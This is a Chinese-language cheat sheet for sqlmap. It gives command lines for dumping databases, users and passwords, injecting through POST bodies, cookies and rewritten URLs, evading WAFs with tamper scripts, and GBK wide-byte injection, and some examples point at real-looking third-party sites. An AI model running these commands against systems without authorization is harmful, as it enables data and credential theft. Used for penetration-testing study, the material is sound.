# Sqlmap使用
### 常规用法
- `python sqlmap.py -u "地址" --dbs` 列取数据库的所有库
- `python sqlmap.py -u "地址" --users` 查询所有用户
- `python sqlmap.py -u "地址" --passwords` 查询账户和密码
- `python sqlmap.py -u "地址" --current-db` 列取当前数据库
- `python sqlmap.py -u "地址" --current-user` 查询当前用户
- `python sqlmap.py -u "地址" -D 库名 --tables` 查询库中所有表
- `python sqlmap.py -u "地址" -D 库名 -T 表名 --columns` 查询指定库指定表中所有列
- `python sqlmap.py -u "地址" -D 库名 -T 表名 -C 字段,字段,字段 --dump` 查询指定库指定表指定列名的字段
- `-D 库名 -T 表名 -C 字段,字段 -start 1 -stop 10 --dump` 导出 1 到 10 行的字段

### sqlmap post 注入

结合 burpsuite 来使用 sqlmap:
1. 浏览器打开目标地址http:// www.2cto.com /Login.as
2. 配置 burp 代理 (127.0.0.1:8080) 以拦截请求
3. 点击 login 表单的 submit 按钮
4. 这时候 Burp 会拦截到了我们的登录 POST 请求
5. 把这个 post 请求复制为 txt, 我这命名为 search-test.txt 然后把它放至 sqlmap 目录下
6. 运行 sqlmap 并使用如下命令： `python sqlmap.py -r search-test.txt -p tfUPass` 参数 -r 是让 sqlmap 加载 post 请求 rsearch-test.txt， 而 -p 指定注入用的参数。

### sqlmap cookies注入

`sqlmap.py -u “http://127.0.0.1/base.php” –cookies “id=1″ –dbs –level 2`

默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值>=2的时候也会检查cookie时面的参数，当>=3的时候将检查User-agent和Referer，那么这就很简单了，我 们直接在原有的基础上面加上 –level 2 即可

利用sqlmap cookies注入突破用户登录继续注入 先把用户登陆的cookie拿到吧， 在收藏夹添加一个链接cookies属性： 名字自己取 javascript:alert(document.cookie)，，需要获取当前cookie的时候， 直接点一下这个链接，然后复制一下弹出对话框 里的cookie值就搞定了

`python sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test”`

-p是指指定参数注入

### sqlmap遇到url重写的注入

哪里存在注入就加上 * 号 `python sqlmap.py -u “http://www.cunlide.com/id1/1*/id2/2“`

### sqlmap 编码绕waf注入

- `python sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py”`

在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载

### 宽字节注入 (GBK)
- `py -2 sqlmap.py -u url?id=1%df%27`


### 相关链接
- https://www.freebuf.com/sectool/164608.html
- http://www.91ri.org/3574.html
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTg1MTMzNTI5NSwxNTgwMjQ0MTI4LC0xOT
MwMDc5MDk0XX0=
-->